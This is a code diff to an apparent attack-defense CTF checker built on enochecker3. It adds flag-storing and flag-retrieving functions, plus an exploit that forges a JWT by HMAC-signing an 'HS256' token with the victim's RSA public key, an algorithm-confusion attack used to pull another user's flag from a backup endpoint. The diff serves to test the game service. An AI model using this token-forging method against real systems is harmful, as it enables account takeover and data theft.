@@ -19,6 +19,10 @@ import rsa
 import base64
 from Crypto.Util.Padding import pad, unpad
 
+#exploit 3
+from Crypto.PublicKey import RSA
+from Crypto.Hash import HMAC, SHA256
+
 
 
 from enochecker3 import (
@@ -689,6 +693,111 @@ async def getnoise1(
     #         raise MumbleException("Could not decrypt aes or encrypted note is not there")
     # except:
     #     raise MumbleException("Could not decrypt aes or encrypted note is not there")
+
+"""
+CHECKER FUNCTIONS 2
+"""
+
+@checker.putflag(2)
+async def putflag_test_2(
+    task: PutflagCheckerTaskMessage,
+    client: AsyncClient,
+    db: ChainDB,
+    logger: LoggerAdapter,
+) -> None:
+    try:
+        email_1, password1_1 = await checker_util_func.create_user_backup(client, logger, public_key="on")
+    except:
+        raise MumbleException("Could not create user 1")
+    try:
+        response = await checker_util_func.profile(client, logger)
+    except:
+        raise MumbleException("Could not get profile")
+    try:
+        status = task.flag
+        await checker_util_func.profile_change_status(client, logger, status)
+    except:
+        raise MumbleException("Could not change status")
+    try:
+        response = await checker_util_func.get_token(client, logger)
+    except:
+        raise MumbleException("Could not get token")
+    soup = BeautifulSoup(response.text, "html.parser")
+    notes = soup.find_all('li', class_='list-group-item')
+    notes = [note.text for note in notes]
+    single_string = ''.join(notes)
+    token = single_string.split("Your Token: ")
+    token = token[1]
+    try:
+        await db.set("user_data_2", (email_1, password1_1, token))
+    except:
+        raise MumbleException("Could not set userdata")
+
+    return email_1
+
+@checker.getflag(2)
+async def getflag_test_2(
+    task: GetflagCheckerTaskMessage,
+    client: AsyncClient,
+    db: ChainDB,
+    logger: LoggerAdapter,
+) -> None:
+    try:
+        email, password, token = await db.get("user_data_2")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+    try:
+        response = await checker_util_func.get_token_from_backup(client, logger, email, token)
+    except:
+        raise MumbleException("Could not get token from backup")
+    assert_in(task.flag, response.text, "Flag not found in response")
+    
+@checker.exploit(2)
+async def exploit_test_2(
+    task: ExploitCheckerTaskMessage,
+    client: AsyncClient,
+    db: ChainDB,
+    logger: LoggerAdapter,
+    searcher: FlagSearcher,
+) -> None:
+    if "@scam.com" in task.attack_info:
+        logger.info("attack_info is good")
+    else:
+        return None
+    email = task.attack_info
+
+
+    try:
+        email_attacker, password = await checker_util_func.create_user(client, logger, public_key= None)
+    except:
+        raise MumbleException("Could not create user 3")
+    try:
+        public_key = await checker_util_func.get_user_of_userlist(client, logger, email = email)
+    except:
+        raise MumbleException("Could not get public key")
+    public_key = checker_util_func.format_rsa_public_key(public_key)
+    public_key = public_key + "\n"
+    PUBKEY = RSA.import_key(public_key)
+    PUBKEY = PUBKEY.public_key().export_key(format='PEM')
+    print(PUBKEY)
+
+
+    b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
+    payload = b64(b'{"alg":"HS256"}') + b'.' + b64(f'{{"email":"{email}"}}'.encode('utf-8'))
+    hasher = HMAC.new(PUBKEY, digestmod=SHA256)
+    hasher.update(payload)
+    evil_token = payload + b'.' + b64(hasher.digest())
+    evil_token = evil_token.decode()
+    print("😈",evil_token)
+    print("böser code",evil_token)
+    print("email für attacke", email)
+    try:
+        response = await checker_util_func.get_token_from_backup(client, logger, email, evil_token)
+    except:
+        raise MumbleException("Could not get token from backup")
+    print("das hier ist die response", response.text)
+    if flag := searcher.search_flag(response.text):
+        return flag
     
 
 
@@ -720,7 +829,6 @@ async def havoc_0(
         await checker_util_func.profile_get_private_key(client, logger)
     except:
         raise MumbleException("Could not get private key")
-    
     
 if __name__ == "__main__":
     checker.run()
